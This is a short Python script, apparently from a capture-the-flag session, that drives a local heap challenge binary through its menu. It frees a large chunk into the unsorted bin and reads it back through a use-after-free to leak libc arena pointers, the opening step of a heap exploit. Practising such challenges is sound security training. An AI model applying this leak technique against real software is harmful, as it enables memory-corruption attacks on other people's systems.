import subprocess, time, os, select, sys, struct
BIN='./thermite-charge'
CWD='/home/ctfplayer/workspace'
def start():
    return subprocess.Popen([BIN],cwd=CWD,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
def rd(p,t=0.3):
    time.sleep(t); out=b''
    while True:
        r,_,_=select.select([p.stdout],[],[],0.15)
        if not r: break
        d=os.read(p.stdout.fileno(),65536)
        if not d: break
        out+=d
    return out
def send(p,b):
    p.stdin.write(b); p.stdin.flush(); return rd(p)
def plant(p,slot,size,data):
    send(p,b'1\n'); send(p,str(slot).encode()+b'\n'); send(p,str(size).encode()+b'\n'); return send(p,data)
def defuse(p,slot):
    send(p,b'2\n'); return send(p,str(slot).encode()+b'\n')
def rewire(p,slot,data):
    send(p,b'3\n'); send(p,str(slot).encode()+b'\n'); return send(p,data)
def inspect(p,slot):
    send(p,b'4\n'); return send(p,str(slot).encode()+b'\n')
def leave(p):
    return send(p,b'5\n')
p=start(); rd(p,0.3)
# layout: slot5 chunkA(0x20), slot0 bigB(0x420), slot6 chunkC(0x20)
plant(p,5,0x20,b'G'*0x20)
plant(p,0,0x420,b'B'*0x420)
plant(p,6,0x20,b'C'*0x20)
defuse(p,0)          # bigB -> unsorted bin; fd/bk = main_arena+96
out=inspect(p,0)
sys.stdout.write(repr(out)+'\n')
p.kill()
PYEOF
